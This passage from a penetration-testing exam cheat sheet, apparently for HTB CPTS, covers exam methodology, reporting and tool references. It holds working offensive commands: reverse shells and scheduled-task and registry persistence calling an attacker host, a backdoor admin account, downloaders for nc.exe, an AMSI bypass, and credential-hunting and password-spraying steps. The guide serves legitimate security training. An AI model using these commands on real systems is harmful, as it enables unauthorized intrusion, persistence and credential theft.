echo "bash -i >& /dev/tcp/<lhost>/4444 0>&1" >> ~/.bashrc
# SSH key
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "<your-pubkey>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Windows:
```cmd
:: Scheduled task
schtasks /create /tn Updater /tr "C:\Tools\nc.exe -e cmd <lhost> 4444" /sc minute /mo 5 /ru SYSTEM /f
:: Registry Run
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Tools\nc.exe -e cmd <lhost> 4444" /f
:: New local admin (needs admin)
net user backup P@ssw0rd! /add
net localgroup administrators backup /add
```


### 10.9 Extended File Transfer Code Library

#### 10.9.1 Updog (Python HTTP server with upload)

```bash
pipx install updog
updog -d /tmp/share -p 9999                  # GET + POST upload UI on :9999
```

#### 10.9.2 PHP server (one-liner)

```bash
php -S 0.0.0.0:8080 -t /tmp/share
```

#### 10.9.3 Bash /dev/tcp download (no curl/wget)

```bash
exec 3<>/dev/tcp/<lh>/80
printf 'GET /file HTTP/1.0\r\nHost: x\r\n\r\n' >&3
cat <&3 > /tmp/file
```

#### 10.9.4 Python uploader (catch-only)

```python
python3 -c "
from http.server import *
class H(BaseHTTPRequestHandler):
  def do_POST(s):
    l=int(s.headers['Content-Length']); d=s.rfile.read(l)
    open('out.bin','wb').write(d); s.send_response(200); s.end_headers()
HTTPServer(('0.0.0.0',9999),H).serve_forever()"
```

#### 10.9.5 PowerShell modern download

```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')
$wc.DownloadFile('http://<lh>/nc.exe','C:\Temp\nc.exe')

# TLS-required environments
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc.DownloadFile('https://<lh>/nc.exe','C:\Temp\nc.exe')
```

#### 10.9.6 VBScript downloader

```vbscript
Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://<lh>/nc.exe", False
xHttp.Send
bStrm.Type = 1 : bStrm.Open
bStrm.Write xHttp.responseBody
bStrm.SaveToFile "C:\Windows\Temp\nc.exe", 2
```

#### 10.9.7 JavaScript / WSH downloader

```javascript
var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","http://<lh>/nc.exe",false);
x.send();
var s = new ActiveXObject("ADODB.Stream");
s.Type = 1; s.Open(); s.Write(x.responseBody);
s.SaveToFile("C:\\Windows\\Temp\\nc.exe", 2);
```
Run with: `cscript //nologo //e:javascript dl.js`.

#### 10.9.8 Living-off-the-Land Binaries (Windows full list)

| Binary | Purpose |
| --- | --- |
| certutil | download + base64 |
| bitsadmin | background download |
| msiexec | install + execute MSI from URL |
| mshta | execute remote HTA |
| regsvr32 | execute remote SCT (Squiblydoo) |
| rundll32 | execute DLL exports |
| wmic | execute XSL via wmic |
| installutil | execute .NET assemblies |
| odbcconf | execute remote DLL |
| forfiles | exec arbitrary command |
| ftp -s:cmds.txt | scriptable FTP download |

#### 10.9.9 Living-off-the-Land Binaries (Linux)

```bash
# /dev/tcp                     download (covered above)
# wget / curl                  standard
# python3 -m http.server       host
# php / ruby / perl one-liners
# busybox httpd                if curl/wget missing
busybox httpd -p 8888 -h /tmp/share
# scp / rsync                  if SSH available
# nc -q 0 <h> 80 < file        netcat send
```

---

---

## 11. Reporting Mindset (during the exam)

For every flag / finding, capture as you go:

### 11.1 Per-finding evidence checklist
- [ ] **Vulnerability name** (CWE-aligned: e.g., "CWE-89 — SQL Injection in /search.php q parameter")
- [ ] **Affected host(s)** (`10.x.x.x — hostname.domain`)
- [ ] **Attack chain in plain English** (1-3 sentences)
- [ ] **Reproduction steps** (numbered, exact commands)
- [ ] **Screenshot 1**: the vulnerability (request/response, error, etc.)
- [ ] **Screenshot 2**: the proof of exploitation (whoami, hostname, flag content, file contents)
- [ ] **Screenshot 3**: the impact (DA, root, secret data)
- [ ] **Remediation** (1-2 sentences — don't leave blank)

### 11.2 Per-host capture
```bash
# At every shell:
mkdir -p loot/<ip>-<host>
hostname; whoami /all 2>/dev/null || id
cat /root/flag*.txt /home/*/flag*.txt /Users/*/Desktop/flag*.txt 2>/dev/null
type C:\Users\*\Desktop\flag*.txt 2>nul
type C:\Users\*\flag*.txt 2>nul
```
Save these outputs to a per-host file in your loot folder. Never lose a flag because you typed it correctly but forgot to screenshot.

### 11.3 Attack chain diagram (sketch as you go)

```
[External]      [DMZ]           [Internal]
   You ─→  webapp(SQLi) ─→ Linux box (sudo abuse → root)
                                │
                                └─→ creds in config ─→ pivot ─→ AD user
                                                        │
                                                        └─→ Kerberoast → svc admin
                                                                │
                                                                └─→ DCSync → DA
```
Keep this in `report/attack-chain.md` and update after each compromise.

### 11.4 Credential master file format (`creds/credentials.txt`)

```text
SOURCE                  USER                PASS/HASH                     TYPE       HOST
/var/www/wp-config.php  wordpress           Spr1ng2024!                   plaintext  10.10.10.5
LSASS dump              INLANE\sqlsvc       a1b2c3d4...:e5f6g7h8...       NTLM       10.10.10.7
GetUserSPNs             INLANE\backupsvc    Backup1234! (cracked)         plaintext  -
DPAPI vault             INLANE\jdoe         P@ssw0rd!                     plaintext  10.10.10.7
```


### 11.5 Documentation & Reporting (Full Structure)

#### 11.5.1 Note-taking — required structure during exam

```
exam/
├── 0-scope/
│   ├── ROE.txt                    # Rules of Engagement (copy from email)
│   └── targets.txt
├── 1-recon/
│   ├── nmap/
│   ├── enum-<host>/
│   └── osint/
├── 2-foothold/
│   ├── <host>-<service>/exploit-cmd.txt
│   └── <host>-<service>/screenshot-1.png
├── 3-postex/
│   ├── creds.txt                   # the ONE master file
│   ├── linpeas-<host>.txt
│   └── winpeas-<host>.txt
├── 4-pivot/
│   └── ssh/chisel/ligolo/configs/
├── 5-loot/
│   └── <host>/                     # everything pulled off targets
├── 6-flags/
│   └── <host>-flag.txt             # one file per flag
├── 7-screenshots/
│   ├── 001-foothold-host1.png
│   └── 002-priv-esc-host1.png
└── 8-report/
    ├── attack-chain.md
    ├── findings/
    │   └── <id>-<title>.md
    └── final/
        └── pentest-report.md
```

#### 11.5.2 Report types

| Type | When | Audience |
| --- | --- | --- |
| **Draft Report** | Before retest/QA | Internal / client lead |
| **Final Report** | End of engagement | All stakeholders |
| **Attestation** | Compliance (PCI/HIPAA) | Auditors |
| **Executive Summary** | Standalone exec brief | C-suite |
| **Vulnerability Notification** | Critical findings during testing | Client immediately |

#### 11.5.3 Standard report sections (CPTS-mandated structure)

```text
1. Title page
2. Statement of Confidentiality
3. Executive Summary
   - Engagement scope
   - Approach (black/grey/white box)
   - Key findings (bullets, no jargon)
   - Risk picture (heatmap or 5-bucket count)
   - Strategic recommendations
4. Attack Narrative / Storyline
   - Step-by-step from foothold → DA / final objective
   - Diagrams of network + path
5. Findings (one per vuln)
   - Title / Severity / CVSS
   - Description
   - Affected hosts/URLs
   - Steps to Reproduce (numbered, exact commands, screenshots)
   - Evidence
   - Impact
   - Remediation
   - References
6. Appendices
   - Tools used
   - List of in-scope hosts
   - Cracked credentials (redacted in client deliverable)
   - Scan output extracts
   - Remediation checklist
```

#### 11.5.4 Finding write-up template

```markdown

---

## 12. When You're Stuck — Universal Unstuck Checklist

Run this top to bottom every time you've spent >30 minutes without progress.

1. **Re-run full TCP**: `nmap -p- --min-rate 10000 -Pn -n -sV -sC <ip>` — did you scan all 65535?
2. **Re-run UDP top-100**: SNMP/TFTP/IPMI hide here.
3. **Run service-specific NSE again**: `--script` for the protocol you saw (smb-vuln*, http-enum, ssl-enum-ciphers).
4. **Check for vhosts / subdomains** with the right wordlist; rotate Host header values.
5. **Re-read every banner, error, default page, and HTTP response header**. Look at HTML comments (`view-source:` then Ctrl-F `<!--`). Look at `robots.txt`, `sitemap.xml`, `/.git/`, `/.env`, `/.DS_Store`, `/backup.zip`.
6. **Credential matrix**: every credential you have, against every service on every host (`nxc smb/winrm/ssh/rdp/ftp/mssql/ldap`). New accounts often match old passwords.
7. **Re-run BloodHound** with newly owned principals marked owned. Look at: AdminTo, HasSession, GenericAll/Write, AddMember, ForceChangePassword, AllowedToAct, AddKeyCredentialLink, ReadGMSAPassword, ReadLAPSPassword, CanRDP, CanPSRemote.
8. **Search GPO / SYSVOL / shares for passwords**:
   ```bash
   smbmap -H <dc> -u <u> -p '<p>' -R --depth 5 SYSVOL
   nxc smb <cidr> -u <u> -p '<p>' -M spider_plus
   snaffler.exe -s
   grep -ri "cpassword" SYSVOL/
   grep -riE 'pass|secret|api' shares/
   ```
9. **Internal-only / loopback services** — netstat on every shell, then port-forward:
   ```bash
   ss -tlnp        # Linux
   netstat -ano | findstr LISTENING       # Windows
   # If 127.0.0.1:8080 is listening but firewalled — forward it (§9)
   ```
10. **Re-check sudo/SUID/cron after every compromise** — environments change as services restart.
11. **Look at LinPEAS / WinPEAS RED sections you skipped** — re-read 95+ score items.
12. **Snaffler** the network for shares with secrets (Windows beachhead).
13. **Hidden config** — look at running processes and their command lines for cleartext creds:
    ```bash
    ps -ef | grep -iE 'pass|key|secret'
    wmic process get name,commandline | findstr -i pass
    ```
14. **Recheck Kerberos vectors** if AD is in scope: AS-REP roastable users may appear after enabling new accounts; Kerberoast every newly-discovered SPN.
15. **Try the exam hint!** HTB exam includes hints. Use them. They cost nothing in points.
16. **Reset and re-do** — if something is genuinely broken, reset the host. Sometimes a previous attempt left residue.

---

## 13. Tool Quick Reference

(Install assumes Kali/Parrot; commands are most-used flags.)

### Recon / scanning
- **nmap**: `apt install nmap`
  ```bash
  sudo nmap -p- --min-rate 10000 -Pn -n -sV -sC -oA full <ip>
  sudo nmap -sU --top-ports 100 -oA udp <ip>
  ```
  Failure: targets behind ICMP-blocking firewall → add `-Pn`. Slow → `--min-rate 10000`.

- **masscan**: `apt install masscan`
  ```bash
  sudo masscan -p1-65535 --rate 10000 <cidr> -oG masscan.txt
  ```

- **rustscan**: alt fast scanner, pipes to nmap.

### Web
- **ffuf**: `apt install ffuf`
  ```bash
  ffuf -u "http://<h>/FUZZ" -w wordlist -mc all -fc 404 -recursion -recursion-depth 2
  ```
  Failures: catch-all 200s → `-fs <baseline>` to filter; rate limit → `-rate 50`.

- **feroxbuster**: `apt install feroxbuster` — recursive by default, pretty output.
- **gobuster**: `apt install gobuster` — most stable for plain dir scans.
- **wfuzz**: legacy alternative.
- **nuclei**: `nuclei -u <h> -severity medium,high,critical` (template-based scanner).
- **whatweb / wappalyzer-cli**: technology fingerprinting.
- **wpscan**: `wpscan --url <h> --enumerate u,vp,vt --api-token <t>`.
- **nikto**: `nikto -h <h>` — quick web sanity check.

### SMB / AD
- **NetExec (nxc)** (replaces CrackMapExec): `pipx install netexec`
  ```bash
  nxc smb/winrm/ldap/mssql/ssh/rdp/ftp <ip|cidr> -u <u> -p '<p>'
  nxc smb <ip> -u <u> -H <NTLM>
  nxc smb <ip> -u <u> -p '<p>' --shares --users --groups --pass-pol --rid-brute --gen-relay-list relay.txt
  nxc ldap <dc> -u <u> -p '<p>' --kerberoasting kerb.hash --asreproast asrep.hash
  nxc smb <cidr> -u <u> -p '<p>' -M spider_plus
  ```
- **enum4linux-ng**: `apt install enum4linux-ng` — `enum4linux-ng -A <ip>`.
- **smbclient/smbmap**: `apt install smbclient smbmap`.
- **rpcclient**: `rpcclient -U "" -N <ip>`.
- **kerbrute**: `go install github.com/ropnop/kerbrute@latest`.
- **bloodhound-python**: `pipx install bloodhound`.
- **BloodHound CE**: docker compose up.
- **Impacket suite** (`apt install python3-impacket`): GetUserSPNs, GetNPUsers, secretsdump, psexec, wmiexec, smbexec, atexec, ntlmrelayx, mssqlclient, rpcdump, getTGT, ticketer, raiseChild, dacledit, rbcd.
- **certipy**: `pipx install certipy-ad`.
- **PKINITtools**: `git clone https://github.com/dirkjanm/PKINITtools`.
- **pywhisker**: `git clone https://github.com/ShutdownRepo/pywhisker`.
- **bloodyAD**: `pipx install bloodyAD`.
- **Responder**: `apt install responder`. Run: `sudo responder -I tun0 -wd`.
- **PetitPotam.py**: `git clone https://github.com/topotam/PetitPotam`.

### Windows beachhead
- **PowerView.ps1**, **PowerUp.ps1**, **Invoke-Mimikatz.ps1**, **SharpHound.ps1/.exe**, **Rubeus.exe**, **Seatbelt.exe**, **Snaffler.exe**, **PrintSpoofer.exe**, **GodPotato-NETx.exe**.
- Bypass AMSI before importing PS scripts:
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```

### Tunneling
- **chisel**: `go install github.com/jpillora/chisel@latest` (or download static binary).
- **sshuttle**: `apt install sshuttle`.
- **ligolo-ng**: download release binaries (proxy + agent).
- **proxychains4**: `apt install proxychains4`. Edit `/etc/proxychains4.conf`.
- **socat**: `apt install socat`.
- **dnscat2**: `apt install dnscat2-server`.
- **ptunnel-ng**: `git clone https://github.com/utoni/ptunnel-ng`.

### Password cracking
- **hashcat**: `apt install hashcat`.
- **john**: `apt install john`.
- **hashid**, **name-that-hash**.
- **CeWL**: `apt install cewl`.
- **rockyou**: `gunzip /usr/share/wordlists/rockyou.txt.gz`.
- **Seclists**: `apt install seclists` — base of /usr/share/seclists/.
- **OneRuleToRuleThemAll**: download from NotSoSecure GitHub.

### Web exploit / scan
- **sqlmap**: `apt install sqlmap`.
- **Burp Suite** (Community/Pro): use proxy on 127.0.0.1:8080; install CA in browser (see Using Web Proxies notes).
- **ZAP** alternative.
- **xsstrike**, **commix**, **dotdotpwn** (LFI), **wfuzz**.

### Shells / payload
- **msfvenom / metasploit-framework**: `apt install metasploit-framework`.
- **searchsploit**: `apt install exploitdb` — `searchsploit -m <id>` to copy locally.
- **pwncat-cs**: `pipx install pwncat-cs` (auto TTY-upgrade, persistence helpers).

### Privilege escalation enumeration
- **linpeas.sh** / **winPEAS.exe / winPEASany.exe** / **lse.sh** / **linenum.sh** — download from PEASS-ng GitHub.
- **PowerUp.ps1** — Windows.
- **GTFOBins** — bookmark `gtfobins.github.io` and `lolbas-project.github.io`.

### Reporting
- **CherryTree / Joplin / Obsidian** — note-taking.
- **Greenshot / Flameshot** — screenshots with annotation.
- **asciinema** — record terminal session.

---

---

## Appendix E — Service-Port Quick Reference

| Port | Service | First commands |
| --- | --- | --- |
| 21 | FTP | `ftp -nv <ip>` (anon) → nmap ftp-* scripts |
| 22 | SSH | `nc -nv <ip> 22` → nmap ssh-* scripts → key/pass auth |
| 23 | Telnet | `nc -nv <ip> 23` → banner / default creds |
| 25/465/587 | SMTP | smtp-user-enum VRFY/RCPT, open relay test |
| 53 | DNS | `dig axfr @<ip> <dom>`, `dnsenum`, dig records |
| 67/68 | DHCP | mitm6 / Responder for IPv6 takeover |
| 69 | TFTP | guess filenames, `tftp <ip>` |
| 79 | Finger | `finger @<ip>` (legacy) |
| 88 | Kerberos | kerbrute / GetNPUsers |
| 110/995 | POP3 | nmap pop3-*, brute-force |
| 111/2049 | NFS | `showmount -e`, mount |
| 135 | RPC | `rpcclient -U "" <ip>`, MSRPC enum |
| 137-139 | NetBIOS | `enum4linux-ng`, smbclient |
| 143/993 | IMAP | nmap imap-*, brute-force |
| 161/162 | SNMP | `snmpwalk -v2c -c public`, onesixtyone |
| 389/636 | LDAP/LDAPS | ldapsearch, windapsearch, nxc ldap |
| 443 | HTTPS | whatweb + feroxbuster + nikto |
| 445 | SMB | nxc smb, smbclient, smbmap |
| 464 | kpasswd | (Kerberos password change — rare attack) |
| 500 | IKE | ike-scan |
| 512-514 | r-services | rsh-brute / rlogin |
| 587 | SMTP submission | as 25 |
| 623 | IPMI | ipmi_dumphashes (CVE-2013-4786) |
| 873 | Rsync | `rsync --list-only rsync://<ip>:873/` |
| 1433 | MSSQL | mssqlclient.py, nxc mssql |
| 1521 | Oracle TNS | odat all -s |
| 2049 | NFS | showmount -e |
| 2121 | FTP-alt | as 21 |
| 3306 | MySQL | `mysql -h <ip>`, mysql-* scripts |
| 3389 | RDP | xfreerdp, nxc rdp, rdp-* scripts |
| 4848 | Glassfish | default `admin/admin` |
| 5060 | SIP | sipvicious / svwar |
| 5432 | PostgreSQL | `psql -h <ip> -U postgres`, default postgres/postgres |
| 5900 | VNC | vncviewer, no-auth check |
| 5985/5986 | WinRM | evil-winrm, nxc winrm |
| 6379 | Redis | `redis-cli -h <ip>`, no-auth check |
| 8009 | Tomcat AJP | Ghostcat (CVE-2020-1938) |
| 8080/8443 | HTTP-alt | whatweb + feroxbuster (often Tomcat / Jenkins / Splunk) |
| 8500 | ColdFusion | `/CFIDE/administrator/index.cfm` |
| 9200 | Elasticsearch | `curl http://<ip>:9200/_cat/indices` |
| 11211 | Memcached | `nc <ip> 11211` `stats` |
| 27017 | MongoDB | `mongo <ip>:27017`, no-auth check |

---

---

## Appendix A — Common Service-Default-Credentials cheat-sheet

| Service | Default users | Default passwords |
| --- | --- | --- |
| Tomcat manager | tomcat, admin, root | tomcat, admin, s3cret, password |
| JBoss / Wildfly | admin | admin, jboss, password |
| Jenkins | admin | admin, password |
| GLPI | glpi | glpi |
| RouterOS | admin | (blank) |
| Cisco | cisco | cisco |
| MSSQL | sa | (blank), sa, password |
| MySQL | root | (blank), root |
| PostgreSQL | postgres | postgres, (blank) |
| Oracle | system, sys, scott | manager, change_on_install, tiger |
| MongoDB | (none) | (none) – check no-auth |
| Redis | (none) | (none) – check no-auth |
| Memcached | (none) | (none) |
| RabbitMQ mgmt | guest | guest |
| Splunk | admin | changeme |
| Grafana | admin | admin |
| FTP anon | anonymous | anonymous, (any email) |
| HP iLO | Administrator | (random — printed on tag) |
| ActiveMQ | admin | admin |

---

---

## Appendix B — One-liner Triage (run first, all parallel)

```bash
TARGET=10.10.10.10
mkdir -p $TARGET && cd $TARGET

# Full TCP + UDP top + scripts in parallel
sudo nmap -p- --min-rate 10000 -Pn -n -oA tcp $TARGET &
sudo nmap -sU --top-ports 100 -Pn -oA udp $TARGET &
wait

# Service scripts on found ports
PORTS=$(grep -oP '\d+/open' tcp.gnmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
sudo nmap -sV -sC -p$PORTS -Pn -oA services $TARGET

# If web ports open
for p in 80 443 8080 8443; do
  grep -q "^$p/open" tcp.gnmap && {
    whatweb -a3 http://$TARGET:$p &
    feroxbuster -u http://$TARGET:$p -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 -d 2 -o ferox-$p.txt &
  }
done
wait

# If 445 open
grep -q "^445/open" tcp.gnmap && {
  nxc smb $TARGET -u '' -p ''
  enum4linux-ng -A $TARGET > enum4linux.txt
}
```

---

---

## Appendix C — Krb5 / Kerberos quick-fix

When you get `KRB_AP_ERR_SKEW`:
```bash
sudo ntpdate <dc-ip>
# or
sudo timedatectl set-ntp false
sudo date -s "$(curl -sI http://<dc-ip>/ | grep -i '^date:' | sed 's/^date: //I')"
```
When `KDC_ERR_S_PRINCIPAL_UNKNOWN`:
- You used an IP instead of an FQDN — re-run with `<host>.<dom>` (case-sensitive).
- Add `<dc-ip>  <dc-host>.<dom>  <dom>` to `/etc/hosts`.
When `KRB5CCNAME` ignored:
- Some tools want absolute path; use `export KRB5CCNAME=$(pwd)/foo.ccache`.

---

---

## Appendix D — Hash format quick-recognition

```
$1$...$              md5crypt (mode 500)
$2[abxy]$...$        bcrypt (3200)
$5$...$              sha256crypt (7400)
$6$...$              sha512crypt (1800)
$y$...$              yescrypt (newer Linux shadow)
$argon2[id]$...$     argon2 (off-target for exam, mode 26500)
^[0-9a-f]{32}$       MD5/NTLM/LM (need context)
^[0-9a-f]{40}$       SHA1
^[0-9a-f]{64}$       SHA256
^aad3b435...:[0-9a-f]{32}$    LM:NT pair
$krb5tgs$23$         Kerberoast RC4 (13100)
$krb5tgs$17$/$18$    Kerberoast AES128/256 (19600/19700)
$krb5asrep$23$       AS-REP roast (18200)
$NETNTLMv2$ ::: ::: ::: ::: ::: ::    NetNTLMv2 (5600)
```

---

---

## Final Pre-Submit Checklist

**Coverage:**
- [ ] All flags collected and saved with screenshots showing the source path.
- [ ] Every credential in `creds/credentials.txt` has been sprayed against every known host (run the matrix one final time).
- [ ] Every host has a `loot/<ip>-<host>/` folder with at minimum: nmap output, `whoami`/`id` output, flags found.

**Evidence quality:**
- [ ] Attack chain diagram re-drawn after every new host added — final version matches actual compromise path.
- [ ] Every screenshot has IP/hostname visible in the terminal prompt (no anonymous shells in screenshots).
- [ ] Tmux logs grep-confirmed for every `>` / `$` / `#` prompt (proves you ran what you claim).
- [ ] Reproduction steps for each finding written **as you go** (don't leave for the last day).

**Report content:**
- [ ] Every credential captured saved to master `credentials.txt`.
- [ ] Each finding has CVSS vector string (not just score) — e.g., `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.
- [ ] CWE ID assigned to every finding (e.g., CWE-89 SQLi, CWE-79 XSS, CWE-78 CMDi, CWE-22 Path Traversal, CWE-287 Auth, CWE-502 Deserialization).
- [ ] Remediation per finding is **specific** — not "use strong passwords" but "set minimum password length to 14 chars in Group Policy → Computer Configuration → Windows Settings → Security Settings → Account Policies".
- [ ] Executive summary names highest-impact finding in plain English (readable by non-technical stakeholder).
- [ ] Cleanup section in report lists every artifact left behind on targets (or confirms removal).

**Submission:**
- [ ] Re-read §12 (When Stuck) at every dead-end before giving up on a host.
- [ ] Executive summary draft started early — refine on day of submission.
- [ ] Remediation written for every finding (don't leave blank).
- [ ] Cleanup performed before declaring engagement complete.
- [ ] PDF export of report previewed before submission (no broken images, no Lorem Ipsum placeholders).
- [ ] Submission timezone double-checked against deadline (UTC vs local time).
- [ ] Submitted ZIP/PDF opened from a fresh extract to confirm not corrupted and all attachments included.

Trust the methodology. Work the tree. Pivot when stuck. Document continuously. Pass.
